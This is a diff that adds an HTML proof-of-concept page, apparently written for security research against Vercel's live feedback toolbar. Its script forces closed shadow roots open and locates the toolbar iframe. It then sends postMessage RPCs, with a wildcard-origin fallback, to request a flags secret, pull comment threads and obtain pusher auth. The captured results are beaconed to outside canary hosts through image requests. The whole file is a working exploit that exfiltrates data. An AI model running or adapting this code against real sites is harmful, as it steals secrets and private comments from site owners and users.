@@ -1,0 +1,338 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Q2 Plain Browser PoC</title>
+<script>
+// ===== PHASE 0: Monkey-patch attachShadow BEFORE toolbar loads =====
+// This runs in the page's own <script>, not via Playwright addInitScript.
+// The toolbar script (feedback.js) is injected by Vercel's edge AFTER this
+// <head> script runs, so the patch is in place when it calls attachShadow.
+(() => {
+  const RPC_TAG = 'yb-q2-' + Date.now();
+  window.__ybQ2 = {
+    tag: RPC_TAG,
+    stage: 'init',
+    shadows: [],
+    messages: [],
+    rpcResults: {},
+    log: []
+  };
+  function q2log(msg) {
+    const ts = new Date().toISOString();
+    window.__ybQ2.log.push(ts + ' ' + msg);
+    const el = document.getElementById('q2-log');
+    if (el) {
+      const line = document.createElement('div');
+      line.textContent = ts + ' ' + msg;
+      el.appendChild(line);
+    }
+  }
+  window.__ybQ2.q2log = q2log;
+
+  // Monkey-patch attachShadow to force open mode
+  const origAttachShadow = Element.prototype.attachShadow;
+  Element.prototype.attachShadow = function(init) {
+    const shadow = origAttachShadow.call(this, {...init, mode: 'open'});
+    window.__ybQ2.shadows.push({tag: this.tagName, time: Date.now()});
+    q2log('attachShadow intercepted: ' + this.tagName + ' mode=' + init.mode + '->open');
+    return shadow;
+  };
+  q2log('attachShadow monkey-patch installed');
+
+  // Listen for ALL postMessages
+  window.addEventListener('message', event => {
+    if (!event.data || typeof event.data !== 'object') return;
+    const type = String(event.data.type || '');
+    const entry = {
+      origin: event.origin,
+      type: type,
+      id: String(event.data.id || event.data.replyId || ''),
+      ts: Date.now()
+    };
+    window.__ybQ2.messages.push(entry);
+
+    // Capture ALL live-frame-reply messages, keyed by id or replyId
+    const msgId = event.data.id || event.data.replyId;
+    if (type === 'live-frame-reply' && msgId) {
+      const replyId = msgId;
+      q2log('live-frame-reply id=' + replyId + ' result=' + String(JSON.stringify(event.data.result) || 'undefined').slice(0,200) + ' error=' + String(JSON.stringify(event.data.error) || 'undefined').slice(0,200));
+      // Store by ID
+      window.__ybQ2.rpcResults[replyId] = {
+        result: event.data.result,
+        error: event.data.error,
+        origin: event.origin,
+        receivedAt: Date.now()
+      };
+      // Specific flagsSecret capture (match '-flags' suffix)
+      if (replyId.includes('-flags')) {
+        window.__ybQ2.rpcResults._flagsSecret = {
+          result: event.data.result,
+          error: event.data.error,
+          origin: event.origin,
+          receivedAt: Date.now()
+        };
+        const el = document.getElementById('q2-result');
+        if (el) {
+          el.textContent = 'FLAGS_SECRET RPC (id=' + replyId + '): result=' + JSON.stringify(event.data.result) + ' error=' + JSON.stringify(event.data.error);
+          el.style.color = (event.data.result && !event.data.error) ? 'green' : 'red';
+        }
+        // Beacon to canary
+        try {
+          const img = new Image();
+          img.src = 'https://q2-flags-confirmed.canary.yb.ybvip.info/rpc-reply?r=' +
+            encodeURIComponent(JSON.stringify({id: replyId, result: event.data.result, error: event.data.error}).slice(0, 300));
+        } catch(e) {}
+      }
+    }
+
+    // Catch-all: dump full data for ALL live-frame-reply messages
+    if (type === 'live-frame-reply') {
+      const fullDump = {
+        id: event.data.id,
+        replyId: event.data.replyId,
+        result: event.data.result,
+        error: event.data.error,
+        keys: Object.keys(event.data),
+        dataSnippet: JSON.stringify(event.data).slice(0, 500)
+      };
+      if (!window.__ybQ2.allReplies) window.__ybQ2.allReplies = [];
+      window.__ybQ2.allReplies.push(fullDump);
+      q2log('CATCH-ALL live-frame-reply: ' + JSON.stringify(fullDump).slice(0, 300));
+    }
+
+    // Capture Replicache pull reply (for Q3 comment reading)
+    if (type === 'live-frame-reply' && event.data.result?.body?.patch) {
+      const patches = event.data.result.body.patch;
+      q2log('Replicache pull reply: ' + patches.length + ' patches');
+      const commentPatches = patches.filter(p => (p.key || '').includes('commentThread-'));
+      if (commentPatches.length > 0) {
+        window.__ybQ2.rpcResults.comments = commentPatches.map(p => ({
+          key: p.key,
+          count: p.value?.comments?.length || 0,
+          texts: (p.value?.comments || []).map(c => (c.text || '').slice(0, 100))
+        }));
+        q2log('Comments found: ' + commentPatches.length + ' threads');
+        // Beacon for Q3
+        try {
+          const img = new Image();
+          img.src = 'https://q2-comments.canary.yb.ybvip.info/comments?n=' + commentPatches.length +
+            '&texts=' + encodeURIComponent(JSON.stringify(
+              commentPatches.flatMap(p => (p.value?.comments || []).map(c => c.text?.slice(0, 50)))
+            ).slice(0, 500));
+        } catch(e) {}
+      }
+    }
+  });
+
+  // ===== PHASE 1: Find toolbar iframe and wait for auth before sending RPCs =====
+  // The toolbar needs to complete auth before RPCs work.
+  // Wait for 'init-reply' message (toolbar ready) before sending.
+
+  let toolbarReady = false;
+  let pendingRpcFrame = null;
+
+  // Listen for toolbar ready signal
+  window.addEventListener('message', function initHandler(event) {
+    if (event.data?.type === 'init-reply') {
+      q2log('Toolbar init-reply received - toolbar is authenticated and ready!');
+      toolbarReady = true;
+      if (pendingRpcFrame) {
+        q2log('Sending RPCs now that toolbar is ready...');
+        sendRPCs(pendingRpcFrame);
+      }
+    }
+  });
+
+  function findAndFireRPC() {
+    window.__ybQ2.stage = 'searching';
+    q2log('Searching for toolbar iframe...');
+
+    let attempts = 0;
+    const maxAttempts = 120; // 60 seconds at 500ms intervals
+    const poll = setInterval(() => {
+      attempts++;
+      const host = document.querySelector('vercel-live-feedback');
+      if (!host) {
+        if (attempts % 20 === 0) q2log('No toolbar yet after ' + (attempts * 500 / 1000) + 's');
+        if (attempts >= maxAttempts) {
+          clearInterval(poll);
+          window.__ybQ2.stage = 'toolbar-not-found';
+          q2log('TIMEOUT: toolbar never appeared');
+        }
+        return;
+      }
+
+      // Toolbar element found - check shadow root (should be open due to our patch)
+      const sr = host.shadowRoot;
+      if (!sr) {
+        q2log('Toolbar found but shadowRoot is null (closed? patch failed?)');
+        // Fallback: try window.frames shotgun approach
+        tryWindowFrames();
+        return;
+      }
+
+      const iframes = sr.querySelectorAll('iframe');
+      let rpcFrame = null;
+      for (const f of iframes) {
+        if (f.src && f.src.includes('/_next-live/feedback/feedback.html')) {
+          rpcFrame = f;
+          break;
+        }
+      }
+
+      if (!rpcFrame) {
+        if (attempts % 10 === 0) q2log('Toolbar found, shadow open, but RPC iframe not loaded yet (' + iframes.length + ' iframes)');
+        if (attempts >= maxAttempts) {
+          clearInterval(poll);
+          window.__ybQ2.stage = 'iframe-not-found';
+          q2log('TIMEOUT: toolbar iframe never loaded');
+        }
+        return;
+      }
+
+      // Found the toolbar iframe!
+      clearInterval(poll);
+      q2log('Found toolbar iframe: ' + rpcFrame.src.slice(0, 100));
+      window.__ybQ2.stage = 'iframe-found';
+
+      if (toolbarReady) {
+        q2log('Toolbar already ready - sending RPCs immediately');
+        sendRPCs(rpcFrame);
+      } else {
+        q2log('Toolbar iframe found but waiting for init-reply before sending RPCs...');
+        pendingRpcFrame = rpcFrame;
+        // Safety timeout: send RPCs anyway after 30s even without init-reply
+        setTimeout(() => {
+          if (!window.__ybQ2.rpcResults._flagsSecret) {
+            q2log('Safety timeout: sending RPCs without init-reply');
+            sendRPCs(rpcFrame);
+          }
+        }, 30000);
+      }
+    }, 500);
+  }
+
+  function tryWindowFrames() {
+    q2log('Trying window.frames shotgun approach...');
+    for (let i = 0; i < window.frames.length; i++) {
+      try {
+        const flagsId = RPC_TAG + '-shotgun-' + i;
+        window.frames[i].postMessage(
+          {type: 'generate-flags-secret', replyId: flagsId, payload: {}},
+          '*'
+        );
+        q2log('Sent RPC to window.frames[' + i + ']');
+      } catch(e) {
+        q2log('window.frames[' + i + '] error: ' + e.message);
+      }
+    }
+  }
+
+  function sendRPCs(rpcFrame) {
+    q2log('Sending generate-flags-secret RPC...');
+    window.__ybQ2.stage = 'rpc-sent';
+
+    // RPC 1: generate-flags-secret
+    const flagsId = RPC_TAG + '-flags';
+    try {
+      const targetOrigin = new URL(rpcFrame.src).origin;
+      rpcFrame.contentWindow.postMessage(
+        {type: 'generate-flags-secret', replyId: flagsId, payload: {}},
+        targetOrigin
+      );
+      q2log('generate-flags-secret sent with id=' + flagsId + ' to origin=' + targetOrigin);
+    } catch(e) {
+      q2log('ERROR sending flags RPC: ' + e.message);
+      // Fallback: wildcard origin
+      try {
+        rpcFrame.contentWindow.postMessage(
+          {type: 'generate-flags-secret', replyId: flagsId, payload: {}},
+          '*'
+        );
+        q2log('Retried with wildcard origin');
+      } catch(e2) {
+        q2log('FAILED even with wildcard: ' + e2.message);
+      }
+    }
+
+    // RPC 2: Replicache pull (for Q3 comment reading)
+    setTimeout(() => {
+      const pullId = RPC_TAG + '-pull';
+      q2log('Sending Replicache pull RPC...');
+      try {
+        const targetOrigin = new URL(rpcFrame.src).origin;
+        rpcFrame.contentWindow.postMessage(
+          {type: 'replicache-pull', replyId: pullId, payload: {
+            pullVersion: 1,
+            clientGroupID: 'q2-test-' + Date.now(),
+            cookie: null,
+            schemaVersion: '1'
+          }},
+          targetOrigin
+        );
+        q2log('Replicache pull sent');
+      } catch(e) {
+        q2log('ERROR sending pull RPC: ' + e.message);
+      }
+    }, 2000);
+
+    // Also try pusher-auth RPC
+    setTimeout(() => {
+      const pusherId = RPC_TAG + '-pusher';
+      q2log('Sending pusher-auth RPC...');
+      try {
+        const targetOrigin = new URL(rpcFrame.src).origin;
+        rpcFrame.contentWindow.postMessage(
+          {type: 'pusher-auth', replyId: pusherId, payload: {
+            socketId: 'q2-test-socket',
+            channelName: 'private-test'
+          }},
+          targetOrigin
+        );
+        q2log('pusher-auth sent');
+      } catch(e) {
+        q2log('ERROR sending pusher RPC: ' + e.message);
+      }
+    }, 4000);
+
+    // Report final state after 30 seconds
+    setTimeout(() => {
+      window.__ybQ2.stage = 'complete';
+      q2log('Test complete. Results: ' + JSON.stringify(window.__ybQ2.rpcResults));
+      const el = document.getElementById('q2-result');
+      if (el && !el.textContent.includes('FLAGS_SECRET')) {
+        el.textContent = 'No FLAGS_SECRET RPC reply received after 30s. Messages received: ' +
+          window.__ybQ2.messages.length;
+        el.style.color = 'orange';
+      }
+    }, 30000);
+  }
+
+  // Start searching after DOM loads
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', findAndFireRPC);
+  } else {
+    findAndFireRPC();
+  }
+})();
+</script>
+<style>
+body { font-family: monospace; padding: 20px; background: #1a1a2e; color: #e0e0e0; }
+h1 { color: #0ff; }
+#q2-result { font-size: 1.2em; padding: 10px; margin: 10px 0; border: 1px solid #444; }
+#q2-log { font-size: 0.85em; max-height: 400px; overflow-y: auto; border: 1px solid #333; padding: 5px; }
+#q2-log div { border-bottom: 1px solid #222; padding: 2px 0; }
+</style>
+</head>
+<body>
+<h1>Q2: Plain Browser Toolbar RPC PoC</h1>
+<p>This page autonomously patches attachShadow, finds the toolbar iframe, and sends RPCs.
+No Playwright hooks or addInitScript required.</p>
+<h2>Result</h2>
+<div id="q2-result">Waiting for toolbar to load and RPC to fire...</div>
+<h2>Log</h2>
+<div id="q2-log"></div>
+</body>
+</html>
